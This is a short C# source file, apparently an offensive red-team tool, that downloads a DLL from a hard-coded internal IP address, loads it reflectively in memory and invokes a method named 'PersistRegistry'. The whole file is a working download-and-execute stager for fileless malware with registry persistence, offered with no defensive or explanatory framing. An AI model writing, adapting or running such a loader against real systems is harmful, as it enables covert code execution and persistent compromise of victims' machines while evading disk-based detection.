using System;
using System.Net;
using System.Reflection;
using System.Text;

class ReflectiveDllLoader
{
    public static void Main(string[] args)
    {
        
        var wc = new WebClient();
        var dll = wc.DownloadData("http://192.168.128.13/ReflectiveDll.dll");

        var asm = Assembly.Load(dll);
        //                       <namespace>     <class>
        var type = asm.GetType("ReflectiveDll.ReflectiveDll");
        var instance = Activator.CreateInstance(type);
        
        //                 <method name>
        type.InvokeMember("PersistRegistry", BindingFlags.InvokeMethod | BindingFlags.Public | BindingFlags.Static, null, instance, null);
    }
}

